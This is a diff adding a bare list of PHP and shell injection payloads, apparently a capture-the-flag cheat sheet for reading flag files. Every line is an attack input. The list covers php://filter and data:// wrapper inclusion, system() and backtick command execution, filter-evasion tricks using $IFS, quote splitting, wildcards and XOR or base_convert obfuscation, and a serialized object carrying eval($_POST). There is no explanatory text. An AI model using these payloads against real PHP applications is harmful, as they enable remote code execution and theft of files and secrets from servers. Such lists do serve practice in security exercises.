@@ -1,0 +1,43 @@
+=php://filter/convert.base64-encode/resource=flag
+=php://filter/convert.base64-encode/resource=flag.php
+=echo `nl fl''ag.php`;
+=echo `nl fl''ag.ph''p`;
+=system('cat f*');
+=echo `cat f*`;
+=echo`tac%09f*`;
+=include$_GET["url"]?>&url=php://filter/read=convert.base64-encode/resource=flag.php
+=data://text/plain,<?php system('cat f*');?>
+=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
+="");('%60%60%60%60%60%60'|'%13%19%13%14%05%0d')(('%03%01%14'|'%60%60%60').' *');#
+=less flag.php||
+=less$IFS*.php||
+=less<fla''g.php||
+=vi<fla''g.php||
+=vi$IFS/fla''g||
+=nl${IFS}fla''g.php
+=vi${IFS}f???.???
+=vi${IFS}f???.???
+=print_r(scandir(current(localeconv())));
+=highlight_file('flag.php');
+=echo file_get_contents("flag.php");
+=readfile("flag.php");
+=var_dump(file('flag.php'));
+=print_r(file('flag.php'));
+=show_source('flag.php');
+=print_r(scandir("/"));
+=highlight_file('/flag.txt');
+=require('/flag.txt');
+=require_once('/flag.txt');
+=include('/flag.txt');
+=$a=scandir("/");foreach($a as $key=>$value){echo $key."=>".$value;}
+=include('/flag.txt');exit(0);
+=?><?php $a=new DirectoryIterator("glob:///*");foreach($a as $key=>$value){echo $key."=>".$value;};exit(0);?>
+=${PATH:~A}${PWD:~A} ????.???
+=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
+=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???
+=${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???
+=($pi=base_convert)(1751504350,10,36)($pi(1438255411,14,34)(dechex(1852579882)))
+=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})
+=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}(($$pi){abs});&pi=system&abs=ls
+=O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A16%3A%22eval%28%24_POST%5Ba%5D%29%3B%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D
+=system('cat ../../flag.php');
